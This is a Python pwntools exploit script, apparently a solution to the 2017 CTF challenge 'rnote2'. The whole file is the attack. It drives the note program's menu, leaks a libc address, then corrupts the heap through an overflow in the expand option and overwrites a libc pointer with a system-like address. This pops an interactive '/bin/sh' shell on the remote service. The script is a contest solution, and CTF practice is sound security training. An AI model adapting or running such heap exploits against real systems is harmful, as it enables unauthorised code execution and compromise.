from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('rnote2.2017.teamrois.cn', 6666)
def add(length,content):
  s.recvuntil('Your choice:')
  s.send('1\n')
  s.recvuntil('length:')
  s.send(str(length)+'\n')
  s.recvuntil('content:')
  s.send(content)
def delete(index):
  s.recvuntil('Your choice:')
  s.send('2\n')
  s.recvuntil('delete?')
  s.send(str(index)+'\n')
def edit(index,content):
  s.recvuntil('Your choice:')
  s.send('4\n')
  s.recvuntil('edit?')
  s.send(str(index)+'\n')
  s.recvuntil('content:')
  s.send(content)
def expand(index,length,content):
  s.recvuntil('Your choice:')
  s.send('5\n')
  s.recvuntil('expand?')
  s.send(str(index)+'\n')
  s.recvuntil('expand?')
  s.send(str(length)+'\n')
  s.recvuntil('expand')
  s.send(content)
def view():
  s.recvuntil('Your choice:')
  s.send('3\n')

add(0x100,'K'*0x100)
add(0x100,'K'*0x100)
delete(1)
add(0x100,'\n')
view()
libc = u64(s.recvuntil('\x7f')[-6:]+'\x00\x00') - 0x3c3b0a
log.info('LIBC : 0x%x'%libc)
add(0x37,'A'*0x37)
delete(3)
add(0x30,'/bin/sh;'+'B'*0x28)
add(0x20,'C'*0x20)
expand(3,3,'A'+'\x61'+'\n')
delete(4)
dat = 'A'*0x30
dat += p64(0) + p64(0x10)
dat += p64(0xdeadbeef)*2
dat += p64(libc+0x3c57a8)
add(0x58,dat)
edit(4,p64(libc+0x45390)+'\n')
s.interactive()
